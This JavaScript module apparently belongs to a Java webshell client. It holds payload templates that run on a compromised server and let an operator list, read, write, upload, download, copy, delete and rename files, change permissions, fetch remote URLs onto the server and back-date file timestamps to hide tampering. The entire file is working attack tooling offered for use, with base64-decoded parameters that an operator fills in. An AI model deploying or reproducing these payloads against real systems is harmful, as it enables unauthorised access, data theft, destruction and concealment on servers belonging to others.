/**
 * 文件管理模板
 */

module.exports = (arg1, arg2, arg3) => ({
  dir: {
    _: `
    function FileTreeCode(dirPath) {
      var oF = new File(dirPath);
      var l = oF.listFiles();
      var s = "", sT, sQ, sF = "";
      var dt;
      var fm = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
      for (var i = 0; i < l.length; i++) {
          dt = new java.util.Date(l[i].lastModified());
          sT = fm.format(dt);
          sQ = l[i].canRead() ? "R" : "-";
          sQ += l[i].canWrite() ? "W" : "-";
          try {
              sQ += l[i].getClass().getMethod("canExecute").invoke(l[i]) ? "X" : "-";
          }catch (e) {
              sQ += "-";
          }
          var nm = l[i].getName();
          if (l[i].isDirectory()) {
              s += nm + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\\n";
          } else {
              sF += nm + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\\n";
          }
      }
      s += sF;
      return s;
  }
  var dirPath=decode("#{newbase64::path}");
  output.append(FileTreeCode(dirPath));
  `.replace(/\n\s+/g, ""),
  },

  delete: {
    _: `
    function DeleteFileOrDirCode(fileOrDirPath) {
      var f = new File(fileOrDirPath);
      if (f.isDirectory()) {
        var x = f.listFiles();
        for (var k = 0; k < x.length; k++) {
          if (!x[k].delete()) {
            DeleteFileOrDirCode(x[k].getPath());
          }
        }
      }
      f.delete();
      return "1";
    }
    
    var fileOrDirPath = decode("#{newbase64::path}");
    output.append(DeleteFileOrDirCode(fileOrDirPath));
    `.replace(/\n\s+/g, ""),
  },

  create_file: {
    _: `
    function WriteFileCode(filePath, fileContext) {
      var h = "0123456789ABCDEF";
      var fileHexContext = strtohexstr(fileContext);
      var f = new File(filePath);
      var os = new FileOutputStream(f);
      for (var i = 0; i < fileHexContext.length(); i += 2) {
        os.write(
          (h.indexOf(fileHexContext.charAt(i)) << 4) |
            h.indexOf(fileHexContext.charAt(i + 1))
        );
      }
      os.close();
      return "1";
    }
    
    function strtohexstr(fileContext) {
      var h = "0123456789ABCDEF";
      var bytes = fileContext.getBytes(cs);
      var sb = new StringBuilder(bytes.length * 2);
      for (var i = 0; i < bytes.length; i++) {
        sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
        sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
      }
      return sb.toString();
    }
    
    var z1 = decode("#{newbase64::path}");
    var z2 = decode("#{newbase64::content}");
    
    output.append(WriteFileCode(z1, z2));
    `.replace(/\n\s+/g, ""),
  },

  read_file: {
    _: `
    function ReadFileCode(filePath) {
      var l = "";
      var s = "";
      var br = new BufferedReader(
        new InputStreamReader(new FileInputStream(new File(filePath)), cs)
      );
      while ((l = br.readLine()) != null) {
        s += l + "\\r\\n";
      }
      br.close();
      return s;
    }
    
    var z1 = decode("#{newbase64::path}");
    output.append(ReadFileCode(z1));
    `.replace(/\n\s+/g, ""),
  },

  copy: {
    _: `
    function CopyFileOrDirCode(sourceFilePath, targetFilePath) {
      var sf = new File(sourceFilePath),
        df = new File(targetFilePath);
      if (sf.isDirectory()) {
        if (!df.exists()) {
          df.mkdir();
        }
        var z = sf.listFiles();
        for (var j = 0; j < z.length; j++) {
          CopyFileOrDirCode(
            sourceFilePath + "/" + z[j].getName(),
            targetFilePath + "/" + z[j].getName()
          );
        }
      } else {
        var is = new FileInputStream(sf);
        var os = new FileOutputStream(df);
        var tempByte;
        while ((tempByte = is.read()) != -1) {
          os.write(tempByte);
        }
        is.close();
        os.close();
      }
      return "1";
    }
    
    var z1 = decode("#{newbase64::path}");
    var z2 = decode("#{newbase64::target}");
    output.append(CopyFileOrDirCode(z1, z2));
    `.replace(/\n\s+/g, ""),
  },

  download_file: {
    _: `
    function DownloadFileCode(filePath, r) {
      r.reset();
      var os = r.getOutputStream();
      var is = new BufferedInputStream(new FileInputStream(filePath));
      os.write(tag_s.getBytes());
      var tempByte;
      while ((tempByte = is.read()) != -1) {
        os.write(tempByte);
      }
      os.write(tag_e.getBytes());
      os.close();
      is.close();
    }
    var z1 = decode("#{newbase64::path}");
    output.append(DownloadFileCode(z1, response));
    `.replace(/\n\s+/g, ""),
  },

  upload_file: {
    _: `
    function UploadFileCode(savefilePath, fileHexContext) {
      var h = "0123456789ABCDEF";
      var f = new File(savefilePath);
      f.createNewFile();
      var os = new FileOutputStream(f, true);
      for (var i = 0; i < fileHexContext.length(); i += 2) {
        os.write(
          (h.indexOf(fileHexContext.charAt(i)) << 4) |
            h.indexOf(fileHexContext.charAt(i + 1))
        );
      }
      os.close();
      return "1";
    }
    var z1 = decode("#{newbase64::path}");
    var z2 = decode("#{buffer::content}");
    output.append(UploadFileCode(z1, z2));
    `.replace(/\n\s+/g, ""),
  },

  rename: {
    _: `
    function RenameFileOrDirCode(oldName, newName) {
      var sf = new File(oldName),
        df = new File(newName);
      sf.renameTo(df);
      return "1";
    }
    var z1 = decode("#{newbase64::path}");
    var z2 = decode("#{newbase64::name}");
    output.append(RenameFileOrDirCode(z1, z2));
    `.replace(/\n\s+/g, ""),
  },

  retime: {
    _: `
    function ModifyFileOrDirTimeCode(fileOrDirPath, aTime) {
      var f = new File(fileOrDirPath);
      var fm = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
      var dt = fm.parse(aTime);
      f.setLastModified(dt.getTime());
      return "1";
    }
    var z1 = decode("#{newbase64::path}");
    var z2 = decode("#{newbase64::time}");
    output.append(ModifyFileOrDirTimeCode(z1, z2));
    `.replace(/\n\s+/g, ""),
  },

  chmod: {
    _: `
    function ChmodCode(path, permstr) {
      try {
        var permissions = Integer.parseInt(permstr, 8);
        var f = new File(path);
        if ((permissions & 256) > 0) {
          f.getClass().getDeclaredMethod("setReadable").invoke(f, true, true);
        }
        if ((permissions & 128) > 0) {
          f.getClass().getDeclaredMethod("setWritable").invoke(f, true, true);
        }
    
        if ((permissions & 64) > 0) {
          f.getClass().getDeclaredMethod("setExecutable").invoke(f, true, true);
        }
        if ((permissions & 32) > 0) {
          f.getClass().getDeclaredMethod("setReadable").invoke(f, true, false);
        }
        if ((permissions & 16) > 0) {
          f.getClass().getDeclaredMethod("setWritable").invoke(f, true, false);
        }
        if ((permissions & 8) > 0) {
          f.getClass().getDeclaredMethod("setExecutable").invoke(f, true, false);
        }
        if ((permissions & 4) > 0) {
          f.getClass().getDeclaredMethod("setReadable").invoke(f, true, false);
        }
        if ((permissions & 2) > 0) {
          f.getClass().getDeclaredMethod("setWritable").invoke(f, true, false);
        }
        if ((permissions & 1) > 0) {
          f.getClass().getDeclaredMethod("setExecutable").invoke(f, true, false);
        }
      } catch (e) {
        return "0";
      }
      return "1";
    }
    var z1 = decode("#{newbase64::path}");
    var z2 = decode("#{newbase64::mode}");    
    output.append(ChmodCode(z1, z2));`.replace(/\n\s+/g, ""),
  },

  mkdir: {
    _: `
    function CreateDirCode(dirPath) {
      var f = new File(dirPath);
      f.mkdir();
      return "1";
    }
    var z1 = decode("#{newbase64::path}");
    output.append(CreateDirCode(z1));
    `.replace(/\n\s+/g, ""),
  },

  wget: {
    _: `
    function WgetCode(urlPath, saveFilePath) {
      var u = new java.net.URL(urlPath);
      var n = 0;
      var os = new FileOutputStream(saveFilePath);
      var h = u.openConnection();
      var is = h.getInputStream();
      var tempByte;
      while ((tempByte = is.read()) != -1) {
        os.write(tempByte);
      }
      os.close();
      is.close();
      h.disconnect();
      return "1";
    }
    var z1 = decode("#{newbase64::url}");
    var z2 = decode("#{newbase64::path}");
    output.append(WgetCode(z1, z2));
    `.replace(/\n\s+/g, ""),
  },

  filehash: {
    _: `
    importPackage(Packages.java.security);
    function getDigest(algorithm) {
        return MessageDigest.getInstance(algorithm);
    };
    function getMd5Digest(){
        return getDigest("MD5");
    };
    function updateDigest(digestObj, inputStream) {
        var s = new Array(2048).join(".");
        var buffer=s.getBytes();
        var read = inputStream.read(buffer,0, 1024);
        while(read > -1) {
            digestObj.update(buffer,0, read);
            read = inputStream.read(buffer,0, 1024);
        }
        return digestObj;
    };
    function digest(messageDigest, data){
      return updateDigest(messageDigest, data).digest();  
    };
    function md5(inputStream){
        return digest(getMd5Digest(), inputStream);
    };
    function md5Hex(inputStream) {
        return encodeHex(md5(inputStream));
    };
    function encodeHex(bytes) {
        var h = "0123456789ABCDEF";
        var sb = new StringBuilder(bytes.length * 2);
        for (var i = 0; i < bytes.length; i++) {
            sb.append(h.charAt((bytes[i] & 0xf0) >> 4));
            sb.append(h.charAt((bytes[i] & 0x0f) >> 0));
        }
        return sb.toString();
    };
    function FilehashCode(filePath) {
        var s = "";
        var md5s = md5Hex(new FileInputStream(filePath));
        s += "MD5\\t" + md5s + "\\n";
        return s;
    };
    var z1 = decode("#{newbase64::path}");
    output.append(FilehashCode(z1));
    `.replace(/\n\s+/g, ""),
  },
});